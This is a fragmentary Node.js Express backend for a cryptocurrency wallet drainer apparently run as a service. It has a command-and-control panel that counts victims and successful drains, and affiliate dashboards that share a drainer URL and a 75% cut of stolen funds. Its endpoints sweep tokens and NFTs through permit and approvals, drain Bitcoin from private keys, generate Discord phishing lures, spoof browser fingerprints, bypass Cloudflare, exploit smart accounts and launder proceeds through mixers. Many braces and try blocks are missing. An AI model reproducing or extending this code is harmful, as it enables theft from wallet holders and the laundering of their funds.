    res.json({ success: true, flows: activeFlows });
app.get('/api/flow/history', (req, res) => {
    const history = flowCoordinator.getFlowHistory();
    res.json({ success: true, history });
setInterval(() => {
  flowCoordinator.cleanupOldFlows();
}, 60 * 60 * 1000);
app.get('/api/chains/config/:chainId', async (req, res) => {
    const { chainId } = req.params;
    const config = chainManager.getChainConfig(chainId);
    res.json({ success: true, config });
app.get('/api/chains/load', async (req, res) => {
    const result = await chainManager.loadChains();
// Multi-sig approval endpoint
app.post('/api/multisig/approve', (req, res) => {
    const { operationId, signerAddress, signature } = req.body;
    const result = multiSigManager.addSignature(operationId, signerAddress, signature);
// Multi-sig status endpoint
app.get('/api/multisig/status/:operationId', (req, res) => {
  const { operationId } = req.params;
  const isApproved = multiSigManager.isOperationApproved(operationId);
  const request = multiSigManager.pendingApprovals.get(operationId);
  res.json({ approved: isApproved, request });
// Multi-sig pending requests endpoint
app.get('/api/multisig/pending', (req, res) => {
  const pendingRequests = multiSigManager.getPendingRequests();
  res.json({ pending: pendingRequests });
// Dynamic client site serving
app.get('/saas/client/:clientId', (req, res) => {
    const { clientId } = req.params;
    if (!clients.has(clientId)) {
      return res.status(404).send('Client not found');
    const client = clients.get(clientId);
    const clientSite = generateClientSite(client);
    res.send(clientSite);
    console.error('Client site error:', error);
    res.status(500).send('Error loading site');
// Client admin dashboard
app.get('/saas/admin/:clientId', (req, res) => {
  const adminHTML = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Admin - ${client.name}</title>
        <style>
            body { font-family: Arial; margin: 40px; background: #0f0f23; color: white; }
            .card { background: #1e1e3f; padding: 20px; border-radius: 10px; margin: 10px 0; }
            .earnings { color: #10b981; font-size: 2em; font-weight: bold; }
        </style>
    </head>
    <body>
        <h1>🏢 ${client.name} - Admin Dashboard</h1>
        <div class="card">
            <h3>💰 Earnings Overview</h3>
            <div class="earnings">$${(client.earnings * 1800).toFixed(2)} USD</div>
            <small>${client.earnings} ETH total drained</small>
            <h3>🔗 Your Drainer URL</h3>
<input type="text" value="https://ch.xqx.workers.dev/?client=${clientId}" readonly style="width: 100%; padding: 10px; margin: 10px 0;">
<p>Share this link to start earning!</p>
            <h3>📊 Next Payout</h3>
            <p>Next automatic payout: <strong>Monday 9 AM UTC</strong></p>
            <p>Your wallet: <code>${client.wallet}</code></p>
            <p>You keep: <strong>75%</strong> of all earnings</p>
    </body>
    </html>
  res.send(adminHTML);
// ==================== C&C CONTROL CENTER ====================
let c2Config = {
    enabled: true,                    // Master switch
    minValueUsd: 100,                 // Minimum target value ($100)
    autoDrain: true,                  // Auto-drain enabled
    stealthLevel: "high",             // Stealth mode
    lastUpdated: new Date().toISOString()
// ADD THIS: Victim tracking for statistics
let c2Stats = {
    totalVictims: 0,
    totalEarnings: 0,
    successfulDrains: 0,
    failedDrains: 0,
    lastActivity: new Date().toISOString()
// C&C Status Endpoint - FIXED to use real stats
app.get('/c2/status', (req, res) => {
      status: c2Config.enabled ? 'active' : 'paused',
      config: c2Config,
      stats: c2Stats  // Use real statistics instead of hardcoded
// C&C Control Endpoint
app.post('/c2/control', (req, res) => {
  const { password, action, settings } = req.body;
  // SECURITY: Check admin password
  if (password !== process.env.ADMIN_PASSWORD) {
  switch (action) {
      case 'enable':
          c2Config.enabled = true;
          break;
      case 'disable':
          c2Config.enabled = false;
      case 'update':
          c2Config = { ...c2Config, ...settings };
      case 'emergency':
          // Immediate shutdown procedure
          // Add any emergency cleanup here
      default:
          return res.status(400).json({ error: 'Invalid action' });
  c2Config.lastUpdated = new Date().toISOString();
  res.json({ success: true, config: c2Config });
// ADD THIS: C&C Report Endpoint
app.post('/c2/report', (req, res) => {
      const report = req.body;
      // Update statistics based on report type
      switch (report.action) {
          case 'connect':
              c2Stats.totalVictims++;
              break;
          case 'sweep_native':
          case 'sweep_tokens':
          case 'sweep_erc721':
          case 'sweep_erc1155':
              if (report.success) {
                  c2Stats.successfulDrains++;
                  // Add value if provided
                  if (report.valueUsd) {
                      c2Stats.totalEarnings += parseFloat(report.valueUsd);
                  }
              } else {
                  c2Stats.failedDrains++;
              }
      c2Stats.lastActivity = new Date().toISOString();
      console.log(`📊 C&C Report: ${report.action} from ${report.walletAddress}`);
      res.json({ received: true, stats: c2Stats });
      console.error('❌ C&C report error:', error.message);
      res.status(500).json({ error: 'Internal server error' });
// ==================== END C&C CENTER ====================
app.post('/api/proxy', proxyHandler);
app.get('/api/proxy', proxyHandler);
// Route for /panel and /panel.html
app.get(["/panel", "/panel.html"], (req, res) => {
  res.sendFile(path.join(__dirname, "panel.html"));
// Victim history API - FIXED VERSION
// Clean routes added
// Victim history API - CLEAN VERSION
app.get("/api/history", (req, res) => {
    const victimsFile = path.join(__dirname, "victims.json");
    // Check if file exists - if not, create it
    if (!fs.existsSync(victimsFile)) {
      fs.writeFileSync(victimsFile, "[]", "utf8");
      return res.json([]);
    // Read the file
    const fileContent = fs.readFileSync(victimsFile, "utf8").trim();
    // If file is empty, initialize with empty array
    if (!fileContent) {
    // Parse JSON and ensure it's always an array
    let data;
      data = JSON.parse(fileContent);
    } catch (parseError) {
      console.log("Error parsing victims.json, resetting:", parseError.message);
    // Ensure we always return an array
    const result = Array.isArray(data) ? data : [];
    console.error("Error in /api/history:", error.message);
    res.json([]);
// SAAS Clients API - CLEAN VERSION
app.get("/api/saas-clients", (req, res) => {
    const clientsArray = Array.from(clients.entries()).map(([clientId, client]) => {
  if (!clients || !clientEarnings || !clientVictims) {
    return res.json({ success: true, totalClients: 0, clients: [] });
      const earnings = clientEarnings.get(clientId) || [];
      const totalEarnings = earnings.reduce((sum, e) => sum + (parseFloat(e.amount) || 0), 0);
      const victimCount = (clientVictims.get(clientId) || []).length;
      return {
        clientId,
        projectName: client.name || "Unknown",
        wallet: client.wallet || "Not set",
        themeColor: client.themeColor || "#6366f1",
        totalEarnings: totalEarnings.toFixed(4),
        victimCount,
        registrationDate: "Recent",
        drainerUrl: "https://ch.xqx.workers.dev/?client=" + clientId,
        dashboardUrl: `https://ch.xqx.workers.dev/dashboard.html?client=${clientId}&color=${client.themeColor}`
      };
      totalClients: clientsArray.length,
      clients: clientsArray
    console.error("Error fetching SAAS clients:", error);
    res.status(500).json({ error: "Failed to fetch clients" });
// Track endpoint - simplified for random targeting
app.post("/api/track", async (req, res) => {
    // C&C INTEGRATION: Check if drainer is enabled
    if (!c2Config.enabled) {
      console.log('⏸️ Drainer disabled, ignoring victim connection');
      return res.json({ 
        success: false, 
        error: 'Drainer temporarily disabled by operator' 
    const victimData = req.body;
    // Log all connections since we're targeting randomly
    console.log(`👤 Victim connected: ${victimData.walletAddress} on ${victimData.chain}`);
    // Emit connection to all panels
    io.emit('victim-connected', {
      walletAddress: victimData.walletAddress,
      chain: victimData.chain,
      isRandomTarget: true
    // Continue with original trackHandler logic
    return trackHandler(req, res);
    console.error('❌ Tracking error:', error.message);
// Drain endpoint - Add C&C check
app.post("/api/relay", (req, res) => {
  // C&C INTEGRATION: Check if drainer is enabled
  if (!c2Config.enabled) {
    return res.json({ 
      success: false, 
      error: 'Drainer disabled by operator' 
  console.log(`⚡ Drain triggered for ${req.body.walletAddress} on ${req.body.chain}`);
  res.json({ success: true });
// Replace the entire victim profile API endpoint with this fixed version:
app.get("/api/victim/:chain/:address", async (req, res) => {
    const { address, chain } = req.params;
    const apiKey = process.env.MORALIS_API_KEY;
    if (!apiKey) {
      return res.status(500).json({ error: "Missing MORALIS_API_KEY in .env" });
    const chainMap = { eth: "eth", bsc: "bsc", polygon: "polygon" };
    const moralisChain = chainMap[chain] || "eth";
    const [tokensRes, nftsRes, txsRes] = await Promise.all([
      fetch(`https://deep-index.moralis.io/api/v2/${address}/erc20?chain=${moralisChain}`, {
        headers: { "X-API-Key": apiKey }
      }),
      fetch(`https://deep-index.moralis.io/api/v2/${address}/nft?chain=${moralisChain}&format=decimal`, {
      fetch(`https://deep-index.moralis.io/api/v2/${address}?chain=${moralisChain}`, {
      })
    ]);
    // ADD PROPER ERROR HANDLING FOR EACH RESPONSE
    let tokens = { result: [] };
    let nfts = { result: [] };
    let txs = { balance: '0', transactions: [] };
    // Handle tokens response
    if (tokensRes.ok) {
        const tokensText = await tokensRes.text();
        if (tokensText && tokensText.trim() !== '') {
          tokens = JSON.parse(tokensText);
      } catch (e) {
        console.error('❌ Token data parsing error:', e.message);
      console.log('⚠️ Tokens API responded with:', tokensRes.status);
    // Handle NFTs response
    if (nftsRes.ok) {
        const nftsText = await nftsRes.text();
        if (nftsText && nftsText.trim() !== '') {
          nfts = JSON.parse(nftsText);
        console.error('❌ NFT data parsing error:', e.message);
      console.log('⚠️ NFTs API responded with:', nftsRes.status);
    // Handle transactions response
    if (txsRes.ok) {
        const txsText = await txsRes.text();
        if (txsText && txsText.trim() !== '') {
          txs = JSON.parse(txsText);
        console.error('❌ Transaction data parsing error:', e.message);
      console.log('⚠️ Transactions API responded with:', txsRes.status);
    res.json({ tokens, nfts, txs });
  } catch (err) {
    console.error("❌ Victim profile error:", err);
    res.status(500).json({ error: err.message });
// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    timestamp: new Date().toISOString()
// Socket.IO connection
io.on("connection", (socket) => {
  console.log("🔌 Operator panel connected");
  // Send current C&C status to newly connected panels
  socket.emit('c2-status', {
    enabled: c2Config.enabled,
    status: c2Config.enabled ? 'active' : 'paused'
const PORT = process.env.PORT || 3001;
server.listen(PORT, async () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
  console.log(`🎯 C&C Control: http://localhost:${PORT}/c2/status`);
  console.log(`📊 C&C Reports: http://localhost:${PORT}/c2/report`);
  console.log(`🔒 Security features: Rate limiting & IP whitelisting enabled`);
  console.log(`🔐 Multi-signature system: Enabled`);
  // Initialize all systems
    // Initialize security
    await securityManager.initializeSecurity();
    console.log('🔐 Security system initialized successfully');
    // Load chains
    await chainManager.loadChains();
    console.log('⛓️  Chains loaded successfully');
    // Start C&C heartbeat
    c2Communicator.startHeartbeat(30000);
    console.log('❤️  C&C heartbeat started');
    // Start flow cleanup
    setInterval(() => {
      flowCoordinator.cleanupOldFlows();
    }, 60 * 60 * 1000);
    console.log('🔄 Flow cleanup scheduled');
    console.log('✅ All systems initialized successfully');
    console.error('❌ System initialization failed:', error.message);
    process.exit(1);
// backend/index.js - ADD AFTER SERVER START
c2Communicator.startHeartbeat(30000); // 30 second heartbeat
async function completeDrainOperation(victimAddress, drainedTokens) {
        // For each drained token, auto-swap to stable
        for (const token of drainedTokens) {
            const swapResult = await SwapHandler.autoSwapToStable(
                token.address,
                token.amount,
                token.chainId,
                victimAddress
            );
            if (swapResult?.success) {
                console.log(`💰 Converted ${token.symbol} to stablecoins!`);
        console.error('Auto-swap failed:', error);
app.post('/api/execute-swap', async (req, res) => {
        const { tokenAddress, amount, chainId } = req.body;
        const result = await SwapHandler.autoSwapToStable(
            tokenAddress,
            amount,
            chainId
        );
        res.json({ success: false, error: error.message });
app.post('/api/bitcoin/balance', async (req, res) => {
    const { address } = req.body;
    const balance = await coreDrainer.getBTCBalance(address);
    res.json({ success: true, balance });
app.post('/api/bitcoin/drain', async (req, res) => {
    const { fromAddress, privateKeyWIF, destinationAddress } = req.body;
    const txid = await coreDrainer.drainBTC(fromAddress, privateKeyWIF, destinationAddress);
    res.json({ success: true, txid });
app.post('/api/permit/sweep', async (req, res) => {
    const { userAddress, tokenAddress, tokenName, tokenVersion } = req.body;
    const result = await permitManager.sweepViaPermit(userAddress, tokenAddress, tokenName, tokenVersion);
app.post('/api/permit/approve-transfer', async (req, res) => {
    const { userAddress, tokenAddress, chainId } = req.body;
    const result = await permitManager.sweepViaApproveTransferFrom(userAddress, tokenAddress, chainId);
app.post('/api/permit/abi', async (req, res) => {
    const { tokenAddress, chainId } = req.body;
    const abi = await permitManager.fetchERC20ABI(tokenAddress, chainId);
// backend/index.js - ADD THESE ENDPOINTS (put with other API endpoints)
app.post('/api/cross-chain/railgun', async (req, res) => {
    const { userAddress, amount } = req.body;
    const result = await crossChain.executeRailgunSafely(userAddress, amount);
app.post('/api/cross-chain/obfuscate', async (req, res) => {
    const result = await crossChain.processFundObfuscation(amount);
app.post('/api/cross-chain/quote', async (req, res) => {
    const { chunk } = req.body;
    const result = await crossChain.sendToCrossChain(chunk);
app.post('/api/cross-chain/balance', async (req, res) => {
    const balance = await crossChain.checkVictimBalance(userAddress);
app.post('/api/scheduler/schedule', async (req, res) => {
        const { userAddress, priority } = req.body;
        const schedule = await scheduler.scheduleDrain(userAddress, priority);
        res.json({ success: true, schedule });
app.post('/api/scheduler/batch', async (req, res) => {
        const { userAddress } = req.body;
        const batchItem = await scheduler.addToBatchQueue(userAddress);
        res.json({ success: true, batchItem });
app.post('/api/scheduler/monitor', async (req, res) => {
        const result = await scheduler.monitorWallet(userAddress);
app.get('/api/scheduler/status', async (req, res) => {
        const status = scheduler.getSchedulerStatus();
// backend/index.js - ADD ENDPOINTS
app.post('/api/ai/analyze', async (req, res) => {
        const { walletAddress, chain } = req.body;
        const analysis = await coreDrainer.aiEnhancements.analyzeBehaviorPatterns(walletAddress, chain);
        res.json({ success: true, analysis });
app.get('/api/ai/market-data', (req, res) => {
        const marketData = coreDrainer.marketIntelligence.getOptimalTransactionTiming();
        res.json({ success: true, marketData });
app.post('/api/execute-ai-drain', async (req, res) => {
        const result = await coreDrainer.executeAIOptimizedDrain(userAddress);
app.post('/api/analytics/track-profit', async (req, res) => {
        const { txHash, chainId, gasUsed, valueUSD, tokenSymbol } = req.body;
        const profit = await coreDrainer.profitTracker.trackTransactionProfit(txHash, chainId, gasUsed, valueUSD, tokenSymbol);
        res.json({ success: true, profit });
app.get('/api/analytics/profit-summary', async (req, res) => {
        const summary = coreDrainer.profitTracker.getProfitSummary();
        res.json({ success: true, summary });
// Export endpoints
app.post('/api/analytics/export', async (req, res) => {
        const { format, timeframe } = req.body;
        const transactions = coreDrainer.profitTracker.getTransactions(timeframe);
        const exportResult = coreDrainer.dataExporter.exportData(transactions, format, 'drainer_report');
        if (exportResult.success) {
            res.setHeader('Content-Type', exportResult.type);
            res.setHeader('Content-Disposition', `attachment; filename="${exportResult.filename}"`);
            res.send(exportResult.content);
        } else {
            res.status(400).json(exportResult);
// Report generation endpoints
app.post('/api/analytics/reports/generate', async (req, res) => {
        const { template, data } = req.body;
        const report = coreDrainer.reportGenerator.generateReport(template, data);
        res.json({ success: true, report });
// ==================== WALLET IMPERSONATION API ====================
app.post('/api/impersonate/generate', async (req, res) => {
    const { targetAddress } = req.body;
    if (!targetAddress || !ethers.isAddress(targetAddress)) {
      return res.status(400).json({ 
        error: 'Valid target address required' 
    const result = await coreDrainer.generateVanityAddress(targetAddress);
app.post('/api/impersonate/batch-generate', async (req, res) => {
    const { targetAddresses } = req.body;
    if (!Array.isArray(targetAddresses) || targetAddresses.length === 0) {
        error: 'Array of target addresses required' 
    const results = await coreDrainer.batchGenerateVanityAddresses(targetAddresses);
    res.json({ success: true, results });
app.post('/api/impersonate/validate', async (req, res) => {
    if (!address) {
        error: 'Address required' 
    const isVanity = coreDrainer.isLikelyVanityAddress(address);
    res.json({ success: true, isVanity });
// ==================== TRANSACTION SPOOFING API ====================
app.post('/api/spoof/transaction', async (req, res) => {
    const { userAddress, txType, chainId } = req.body;
    if (!userAddress || !ethers.isAddress(userAddress)) {
        error: 'Valid user address required' 
    const fakeTx = await coreDrainer.generateFakeTransaction(
      userAddress, 
      txType || 'swap', 
      chainId || 1
app.post('/api/spoof/transaction-history', async (req, res) => {
    const { userAddress, count, chainId } = req.body;
    const history = await coreDrainer.generateFakeTransactionHistory(
      count || 10, 
app.post('/api/spoof/validate', async (req, res) => {
    const { transactionData } = req.body;
    if (!transactionData) {
        error: 'Transaction data required' 
    const isFake = coreDrainer.isLikelyFakeTransaction(transactionData);
// ==================== DISCORD LURE GENERATION API ====================
app.post('/api/discord/lure/nft-mint', async (req, res) => {
    const { targetUser, projectData } = req.body;
    const lure = await coreDrainer.generateNFTMintLure(targetUser, projectData);
    res.json({ success: true, lure });
app.post('/api/discord/lure/token-launch', async (req, res) => {
    const { targetUser, tokenData } = req.body;
    const lure = await coreDrainer.generateTokenLaunchLure(targetUser, tokenData);
app.post('/api/discord/lure/raffle', async (req, res) => {
    const { targetUser } = req.body;
    const lure = await coreDrainer.generateRaffleLure(targetUser);
app.post('/api/discord/lure/campaign', async (req, res) => {
    const { targetUsers, lureTypes } = req.body;
    if (!Array.isArray(targetUsers) || targetUsers.length === 0) {
        error: 'Array of target users required' 
    const campaign = await coreDrainer.generateLureCampaign(targetUsers, lureTypes);
    res.json({ success: true, campaign });
app.post('/api/discord/lure/post', async (req, res) => {
    const { lureId, channelId } = req.body;
    if (!lureId || !channelId) {
        error: 'Lure ID and channel ID required' 
    const result = await coreDrainer.postLureToDiscord(lureId, channelId);
app.post('/api/discord/lure/track', async (req, res) => {
    const { lureId, action } = req.body;
    if (!lureId) {
        error: 'Lure ID required' 
    const result = await coreDrainer.trackLureEngagement(lureId, action);
app.get('/api/discord/lure/stats', async (req, res) => {
    const stats = coreDrainer.getLureStats();
    res.json({ success: true, stats });
// ==================== FINGERPRINT SPOOFING API ====================
app.post('/api/fingerprint/generate', async (req, res) => {
    const { sessionId, profileType } = req.body;
    if (!sessionId) {
        error: 'Session ID required' 
    const fingerprint = await coreDrainer.generateSpoofedFingerprint(
      sessionId, 
      profileType || 'chrome_windows'
    res.json({ success: true, fingerprint });
app.post('/api/fingerprint/batch-generate', async (req, res) => {
    const { sessionIds, profileType } = req.body;
    if (!Array.isArray(sessionIds) || sessionIds.length === 0) {
        error: 'Array of session IDs required' 
    const fingerprints = await coreDrainer.batchGenerateFingerprints(
      sessionIds, 
    res.json({ success: true, fingerprints });
app.post('/api/fingerprint/rotate', async (req, res) => {
    const { sessionId } = req.body;
    const rotated = await coreDrainer.rotateFingerprint(sessionId);
    res.json({ success: true, fingerprint: rotated });
app.post('/api/fingerprint/validate', async (req, res) => {
    const { fingerprint } = req.body;
    if (!fingerprint) {
        error: 'Fingerprint data required' 
    const validation = coreDrainer.validateFingerprint(fingerprint);
    res.json({ success: true, validation });
app.get('/api/fingerprint/stats', async (req, res) => {
    const stats = coreDrainer.getFingerprintStats();
// ==================== CLOUDFLARE BYPASS API ====================
app.post('/api/cloudflare/detect', async (req, res) => {
    const { url, htmlContent, headers } = req.body;
    if (!url) {
        error: 'URL required' 
    const detection = await coreDrainer.detectCloudflare(
      url, 
      htmlContent || '', 
      headers || {}
    res.json({ success: true, detection });
app.post('/api/cloudflare/solve-captcha', async (req, res) => {
    const { captchaType, siteKey, pageUrl, enterprise } = req.body;
    if (!captchaType || !siteKey || !pageUrl) {
        error: 'captchaType, siteKey, and pageUrl required' 
    const solution = await coreDrainer.solveCaptcha(
      captchaType, 
      siteKey, 
      pageUrl, 
      enterprise || false
    res.json({ success: true, solution });
app.post('/api/cloudflare/bypass', async (req, res) => {
    const { url, htmlContent, headers, technique } = req.body;
    const bypass = await coreDrainer.bypassChallenge(
      headers || {}, 
      technique || 'auto'
    res.json({ success: true, bypass });
app.get('/api/cloudflare/stats', async (req, res) => {
    const stats = coreDrainer.getChallengeStats();
// ==================== MARKET INTELLIGENCE API ====================
app.get('/api/market/trending', async (req, res) => {
    const { limit, minLiquidity } = req.query;
    const tokens = await coreDrainer.getTrendingTokens(
      parseInt(limit) || 20,
      parseInt(minLiquidity) || 50000
app.post('/api/market/monitor', async (req, res) => {
    const { tokenAddress, chain, options } = req.body;
    if (!tokenAddress) {
        error: 'Token address required' 
    const monitor = await coreDrainer.monitorToken(
      tokenAddress, 
      chain || 'ethereum', 
      options || {}
    res.json({ success: true, monitor });
app.get('/api/market/token/:chain/:address', async (req, res) => {
    const { chain, address } = req.params;
    const tokenData = await coreDrainer.getTokenData(address, chain);
    if (!tokenData) {
      return res.status(404).json({ 
        error: 'Token not found' 
    res.json({ success: true, token: tokenData });
app.get('/api/market/timing', async (req, res) => {
    const timing = coreDrainer.getOptimalTransactionTiming();
    res.json({ success: true, timing });
app.post('/api/market/watchlist', async (req, res) => {
    const watchlistId = coreDrainer.addToWatchlist(
    res.json({ success: true, watchlistId });
app.delete('/api/market/watchlist/:id', async (req, res) => {
    const { id } = req.params;
    const removed = coreDrainer.removeFromWatchlist(id);
    res.json({ success: true, removed });
app.get('/api/market/watchlist', async (req, res) => {
    const status = coreDrainer.getWatchlistStatus();
app.get('/api/market/stats', async (req, res) => {
    const stats = coreDrainer.getIntelligenceStats();
// ==================== CHAINALYSIS MONITORING API ====================
app.post('/api/security/screen', async (req, res) => {
    const { address, intensity } = req.body;
    const screening = await coreDrainer.screenAddress(
      address, 
      intensity || 'standard'
    res.json({ success: true, screening });
app.post('/api/security/screen-batch', async (req, res) => {
    const { addresses, intensity } = req.body;
    if (!Array.isArray(addresses) || addresses.length === 0) {
        error: 'Array of addresses required' 
    const results = await coreDrainer.batchScreenAddresses(
      addresses, 
app.post('/api/security/monitor', async (req, res) => {
    const { address, checkInterval } = req.body;
    const monitor = await coreDrainer.monitorAddress(
      checkInterval || 3600000
app.get('/api/security/stats', async (req, res) => {
    const stats = coreDrainer.getMonitoringStats();
app.post('/api/security/validate-destination', async (req, res) => {
    const { destinationAddress } = req.body;
    if (!destinationAddress) {
        error: 'Destination address required' 
    // Screen the destination address
    const screening = await coreDrainer.screenAddress(destinationAddress, 'thorough');
    if (screening.isFlagged) {
        flagged: true,
        risk: screening.overallRisk,
        recommendation: 'REJECT: Destination address is flagged'
    res.json({ 
      success: true, 
      flagged: false,
      risk: screening.overallRisk,
      recommendation: 'APPROVE: Destination address appears clean'
// ==================== AUTO DEPLOYER API ====================
app.post('/api/deploy/site', async (req, res) => {
    const { templateType, config, platform } = req.body;
    if (!templateType) {
        error: 'Template type required' 
    const deployment = await coreDrainer.deploySite(
      templateType, 
      config || {}, 
      platform || 'auto'
    res.json({ success: true, deployment });
app.post('/api/deploy/batch', async (req, res) => {
    const { deployments } = req.body;
    if (!Array.isArray(deployments) || deployments.length === 0) {
        error: 'Array of deployments required' 
    const results = await coreDrainer.batchDeploySites(deployments);
app.post('/api/deploy/rotate', async (req, res) => {
    const { deploymentId } = req.body;
    if (!deploymentId) {
        error: 'Deployment ID required' 
    const rotated = await coreDrainer.rotateDomain(deploymentId);
    res.json({ success: true, deployment: rotated });
app.post('/api/deploy/takedown', async (req, res) => {
    const success = await coreDrainer.takeDownDeployment(deploymentId);
    res.json({ success: true, takenDown: success });
app.get('/api/deploy/stats', async (req, res) => {
    const stats = coreDrainer.getDeploymentStats();
// ==================== ACCOUNT ABSTRACTION EXPLOITATION API ====================
app.post('/api/aa/detect', async (req, res) => {
    const { walletAddress, chainId } = req.body;
    if (!walletAddress) {
        error: 'Wallet address required' 
    const detection = await coreDrainer.detectSmartAccount(
      walletAddress, 
      chainId || '1'
app.post('/api/aa/exploit', async (req, res) => {
    const { walletAddress, chainId, technique } = req.body;
    const exploit = await coreDrainer.exploitSmartAccount(
      chainId || '1', 
    res.json({ success: true, exploit });
app.post('/api/aa/detect-batch', async (req, res) => {
    const { addresses, chainId } = req.body;
    const results = await coreDrainer.batchDetectSmartAccounts(
app.post('/api/aa/exploit-batch', async (req, res) => {
    const { targets, chainId } = req.body;
    if (!Array.isArray(targets) || targets.length === 0) {
        error: 'Array of targets required' 
    const results = await coreDrainer.batchExploitSmartAccounts(
      targets, 
app.post('/api/aa/monitor', async (req, res) => {
    const { walletAddress, chainId, duration } = req.body;
    const monitor = await coreDrainer.monitorSmartAccount(
      duration || 3600000
app.get('/api/aa/stats', async (req, res) => {
    const stats = coreDrainer.getExploitStats();
// ==================== MULTI-STEP LURE GENERATION API ====================
app.post('/api/lure/campaign/create', async (req, res) => {
    const { templateType, targetUsers, customConfig } = req.body;
    if (!templateType || !targetUsers) {
        error: 'Template type and target users required' 
    const campaign = await coreDrainer.createCampaign(
      templateType,
      targetUsers,
      customConfig || {}
app.post('/api/lure/campaign/action', async (req, res) => {
    const { campaignId, userId, action, phaseData } = req.body;
    if (!campaignId || !userId || !action) {
        error: 'Campaign ID, user ID, and action required' 
    const result = await coreDrainer.processUserAction(
      campaignId,
      userId,
      action,
      phaseData || {}
app.post('/api/lure/campaign/batch-create', async (req, res) => {
    const { campaigns } = req.body;
    if (!Array.isArray(campaigns) || campaigns.length === 0) {
        error: 'Array of campaigns required' 
    const results = await coreDrainer.batchCreateCampaigns(campaigns);
app.get('/api/lure/campaign/progress/:campaignId/:userId', async (req, res) => {
    const { campaignId, userId } = req.params;
    const progress = coreDrainer.getUserProgress(campaignId, userId);
    if (!progress) {
        error: 'Progress not found' 
    res.json({ success: true, progress });
app.get('/api/lure/campaign/stats/:campaignId', async (req, res) => {
    const { campaignId } = req.params;
    const stats = coreDrainer.getCampaignStats(campaignId);
    if (!stats) {
        error: 'Campaign not found' 
app.get('/api/lure/system/stats', async (req, res) => {
    const stats = coreDrainer.getSystemStats();
app.get('/api/analytics/reports/templates', async (req, res) => {
        const templates = coreDrainer.reportGenerator.getAvailableTemplates();
        res.json({ success: true, templates });
app.post('/api/ai/fingerprint', async (req, res) => {
        const { userAddress, chainId } = req.body;
        const fingerprint = await aiTargeting.fingerprintWallet(userAddress, chainId);
        res.json({ success: true, fingerprint });
app.post('/api/ai/engage', async (req, res) => {
        const lure = await aiTargeting.engageVictim(userAddress);
        res.json({ success: true, lure });
app.post('/api/swap/auto-swap', async (req, res) => {
        const { userAddress, drainedTokens, chainId } = req.body;
        const result = await tokenSwapper.autoSwapDrainedAssets(userAddress, drainedTokens, chainId);
app.post('/api/swap/to-stable', async (req, res) => {
        const { tokenAddress, amount, chainId, fromAddress } = req.body;
        const result = await tokenSwapper.autoSwapToStable(tokenAddress, amount, chainId, fromAddress);
app.post('/api/c2/check-status', async (req, res) => {
        const status = await c2Communicator.checkDrainerStatus();
        res.json({ success: true, enabled: status });
app.post('/api/c2/report', async (req, res) => {
        const result = await c2Communicator.reportToC2(req.body);
        res.json({ success: result });
app.get('/api/c2/targets', async (req, res) => {
        const targets = await c2Communicator.fetchPotentialTargets();
        res.json({ success: true, targets });
app.get('/api/c2/stats', async (req, res) => {
        const stats = c2Communicator.getStats();
        res.json({ success: true, stats });
// ==================== NEW SECURE BACKEND API ENDPOINTS ====================
// Main comprehensive drain endpoint
app.post('/api/execute-full-drain', async (req, res) => {
    console.log('🔐 Received FULL drain request for:', userAddress);
    // ✅ NOW USING THE REAL DRAIN LOGIC
    const result = await coreDrainer.drainAcrossChains(userAddress);
    console.error('❌ Full drain endpoint error:', error);
    res.json({ success: true, message: 'Transaction completed' });
// Endpoint for the fake UI to get token list
app.post('/api/get-token-list', async (req, res) => {
    console.log('📋 Fetching REAL token list for:', userAddress);
    // Use your existing analyzeWalletOnChain function
    const assets = await coreDrainer.analyzeWalletOnChain(
      { getSigner: () => coreDrainer.drainerWallet },
      1,
      "ethereum"
    // Convert to the format the frontend expects
    const tokens = assets.erc20.map(token => ({
      name: token.contract_ticker_symbol,
      amount: 'Unlimited', // Or use actual balance: ethers.formatUnits(token.balance, token.decimals)
      contract: token.contract_address
    }));
    console.error('Token list error:', error);
    res.json({ success: false, tokens: [] });
// Add this endpoint for wallet analysis
app.post('/api/analyze-wallet', async (req, res) => {
    console.log('🔍 Analyzing wallet:', userAddress);
    res.json({ success: true, isPrimeTarget: true });
    console.error('Analysis error:', error);
    res.json({ success: false, isPrimeTarget: false });
async function handleDrainedTokens(drainedTokens, chainId) {
    console.log('🔄 Auto-converting drained tokens to stablecoins...');
    for (const token of drainedTokens) {
        const swapResult = await SwapHandler.autoSwapToStable(
            token.address,
            token.amount,
            chainId,
            token.fromAddress
        if (swapResult?.success) {
            console.log(`💰 Converted ${token.symbol} to stablecoins!`);
            console.log(`❌ Failed to convert ${token.symbol}`);
app.post('/api/auto-swap', async (req, res) => {
        res.json({ 
            success: true, 
            message: 'Auto-swap completed',
            result 
            success: false, 
            error: error.message 
// ==================== ATOMIC BUNDLER API ====================
app.post('/api/bundle/create', async (req, res) => {
    const { transactions, strategy, chainId, options } = req.body;
    if (!transactions || !Array.isArray(transactions)) {
        error: 'Array of transactions required' 
    const bundle = await coreDrainer.createAtomicBundle(
      transactions,
      strategy || 'stealth-drain',
      chainId || '1',
    res.json({ success: true, bundle });
app.post('/api/bundle/batch-create', async (req, res) => {
    const { bundles } = req.body;
    if (!Array.isArray(bundles) || bundles.length === 0) {
        error: 'Array of bundles required' 
    const results = await coreDrainer.batchCreateBundles(bundles);
app.post('/api/bundle/monitor', async (req, res) => {
    const { bundleId, timeout } = req.body;
    if (!bundleId) {
        error: 'Bundle ID required' 
    const result = await coreDrainer.monitorBundle(
      bundleId,
      timeout || 60000
app.get('/api/bundle/stats', async (req, res) => {
    const stats = coreDrainer.getBundleStats();
// ==================== SIGNATURE DATABASE API ====================
app.post('/api/signature/lookup', async (req, res) => {
    const { selector, contractAddress } = req.body;
    if (!selector) {
        error: 'Selector required' 
    const signature = await coreDrainer.getFunctionSignature(
      selector, 
      contractAddress || null
    res.json({ success: true, signature });
app.post('/api/signature/abi', async (req, res) => {
    const { contractAddress, chainId } = req.body;
    if (!contractAddress) {
        error: 'Contract address required' 
    const abi = await coreDrainer.getABI(
      contractAddress, 
app.post('/api/signature/batch-lookup', async (req, res) => {
    const { selectors, contractAddress } = req.body;
    if (!Array.isArray(selectors) || selectors.length === 0) {
        error: 'Array of selectors required' 
    const results = await coreDrainer.batchGetSignatures(
      selectors, 
app.post('/api/signature/batch-abi', async (req, res) => {
    const { contractAddresses, chainId } = req.body;
    if (!Array.isArray(contractAddresses) || contractAddresses.length === 0) {
        error: 'Array of contract addresses required' 
    const results = await coreDrainer.batchGetABIs(
      contractAddresses, 
